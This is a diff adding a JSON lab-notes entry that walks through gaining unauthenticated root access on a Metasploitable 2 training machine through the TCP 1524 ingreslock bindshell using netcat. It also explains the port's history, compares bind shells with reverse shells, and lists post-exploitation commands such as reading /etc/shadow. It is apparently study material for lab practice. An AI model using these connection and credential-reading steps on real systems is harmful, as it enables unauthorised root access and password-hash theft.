@@ -1,0 +1,47 @@
+{
+  "n": 19,
+  "date": "2026-10-02",
+  "module": "Exploitation & Initial Access",
+  "title": "Unauthenticated Root Bindshell: Ingreslock (TCP 1524) Analysis",
+  "tags": ["bindshell", "netcat", "ingreslock", "root", "initial-access", "metasploitable", "cve"],
+  "summary": "Demonstrated instant unauthenticated root compromise via TCP port 1524 (ingreslock) using basic netcat (nc). Verified complete system control with uid=0(root), explored the underlying UNIX historical lineage of the Ingreslock backdoor, and established the operational distinction between bindshells and reverse shells in penetration testing.",
+  "sections": [
+    {
+      "h": "Initial Access via Netcat",
+      "blocks": [
+        {"t": "p", "text": "Following the port scan that flagged `1524/tcp open bindshell`, executed a direct raw TCP connection from Kali Linux using Netcat (`nc`):"},
+        {"t": "code", "label": "kali", "text": "┌──(general㉿lee)-[~]\n└─$ nc -vn 10.16.141.205 1524\n(UNKNOWN) [10.16.141.205] 1524 (ingreslock) open\nroot@metasploitable:/# \n\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@metasploitable:/# whoami\nroot\n\nroot@metasploitable:/# uname -a\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux"},
+        {"t": "p", "text": "No username, password, or cryptographic handshake was requested. The target immediately returned an interactive root prompt with full system authority (`uid=0, gid=0`)."}
+      ]
+    },
+    {
+      "h": "Why does Port 1524 exist? (The Ingreslock Story)",
+      "blocks": [
+        {"t": "p", "text": "Port 1524 is registered in IANA and `/etc/services` as **`ingreslock`**—originally used by the Ingres relational database management system for its locking service."},
+        {"t": "p", "text": "In early UNIX history, system crackers and rootkit authors frequently bound an interactive `/bin/sh` listener to port 1524. Because `ingreslock` appeared legitimate in service tables, administrators glancing at basic network outputs often overlooked the listening port."},
+        {"t": "p", "text": "In Metasploitable 2, this is configured via `openbsd-inetd` (`/etc/inetd.conf`), instructing the superserver to automatically pipe stdin and stdout of `/bin/sh` to any inbound connection on port 1524."}
+      ]
+    },
+    {
+      "h": "Architectural Distinction: Bind Shell vs Reverse Shell",
+      "blocks": [
+        {"t": "table", "head": ["Shell Type", "How Connection is Established", "Defensive / Firewall Impact"], "rows": [
+          ["**Bind Shell** (Port 1524)", "The target opens a listening port and waits for the attacker to connect inward (`Kali -> Target:1524`).", "Easily blocked by perimeter firewalls or NAT if inbound non-standard ports are denied. Only works because we are on the same local subnet."],
+          ["**Reverse Shell**", "The target initiates an outbound TCP connection back to the attacker's listener (`Target -> Kali:4444`).", "Much more effective in real-world scenarios because egress firewall rules typically allow outbound connections (e.g. ports 80, 443)."]
+        ]}
+      ]
+    },
+    {
+      "h": "Recommended Post-Exploitation Inspection",
+      "blocks": [
+        {"t": "p", "text": "With unrestricted root access on the machine, you can observe critical OS security files that normal users cannot read:"},
+        {"t": "list", "items": [
+          "`cat /etc/shadow` — View password hashes for all accounts (`msfadmin`, `root`, `user`).",
+          "`cat /etc/inetd.conf | grep 1524` — See the exact line spawning the backdoor shell.",
+          "`netstat -tulnp` — See all internal listening sockets from the kernel's perspective.",
+          "`cat /etc/issue` — Confirm host OS distribution details."
+        ]}
+      ]
+    }
+  ]
+}
